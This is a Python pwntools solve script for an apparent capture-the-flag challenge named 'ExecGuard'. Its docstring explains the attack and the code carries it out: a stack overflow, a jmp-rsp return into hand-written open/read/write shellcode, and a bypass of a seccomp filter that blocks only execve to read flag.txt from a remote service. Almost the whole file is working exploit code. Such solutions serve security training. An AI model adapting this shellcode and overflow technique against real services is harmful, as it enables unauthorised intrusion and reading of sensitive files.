#!/usr/bin/env python3
# Capture argv BEFORE pwntools import (pwntools consumes sys.argv at import time)
import sys as _sys; _argv = _sys.argv[:]
"""
ExecGuard — seccomp bypass via open/read/write shellcode

Attack:
  1. Stack overflow in vuln(): read(512) → 64-byte buf
  2. Return to jmp_rsp gadget (0x401166) → jumps to shellcode on stack
  3. Shellcode writes "flag.txt\0" to bss_shellstr (0x404060, fixed BSS addr)
  4. open("flag.txt", O_RDONLY)  — syscall  2, NOT blocked by seccomp
  5. read(fd, bss+8, 64)         — syscall  0, NOT blocked
  6. write(1, bss+8, n)          — syscall  1, NOT blocked → flag printed!

Key insight: The seccomp filter only blocks execve(59) and execveat(322).
             open(2) / read(0) / write(1) are all allowed.
             Blocking exec* does NOT prevent arbitrary file reads.

Usage:
    python3 solve.py [HOST [PORT]]
"""
from pwn import *

HOST = _argv[1] if len(_argv) > 1 else '127.0.0.1'
PORT = int(_argv[2]) if len(_argv) > 2 else 4446

context.arch    = 'amd64'
context.os      = 'linux'
context.log_level = 'info'

# ── known addresses (no PIE → fixed) ──────────────────────────────────────────
JMP_RSP      = 0x401166   # jmp_rsp_gadget: `ff e4` (jmp *%rsp)
BSS_SHELLSTR = 0x404060   # bss_shellstr[64] — stores "flag.txt\0"
BSS_READBUF  = 0x404068   # bss_shellstr + 8 — flag read buffer
OFFSET       = 72         # 64 (buf) + 8 (saved RBP)

# ── shellcode: write "flag.txt\0" to BSS, then open/read/write ────────────────
#
# mov rax, 0x7478742e67616c66   → "flag.txt" in little-endian 8 bytes
# mov [bss_shellstr], rax       → store path at fixed BSS address
# syscall 2: open("flag.txt", O_RDONLY)
# syscall 0: read(fd, bss+8, 64)
# syscall 1: write(1, bss+8, n)
#
# Note: null bytes in shellcode are fine — read() does NOT stop at \x00
sc = asm(f'''
    mov rax, 0x7478742e67616c66
    mov qword ptr [{BSS_SHELLSTR:#x}], rax

    mov eax, 2
    mov rdi, {BSS_SHELLSTR:#x}
    xor esi, esi
    syscall

    mov rdi, rax
    xor eax, eax
    mov esi, {BSS_READBUF:#x}
    mov edx, 64
    syscall

    mov rdx, rax
    mov eax, 1
    mov edi, 1
    mov esi, {BSS_READBUF:#x}
    syscall
''')

log.info(f'Shellcode: {len(sc)} bytes')
log.info(f'jmp_rsp  : {JMP_RSP:#x}')
log.info(f'BSS addr : {BSS_SHELLSTR:#x}')

payload  = b'A' * OFFSET
payload += p64(JMP_RSP)        # overwrite saved RIP → jmp rsp
payload += sc                  # shellcode starts right where RSP points after ret

p = remote(HOST, PORT) if HOST != 'LOCAL' else process('./execguard')
p.recvuntil(b'Input: ')
p.send(payload)
flag = p.recvall(timeout=3)
print('[+] Flag:', flag.decode().strip())
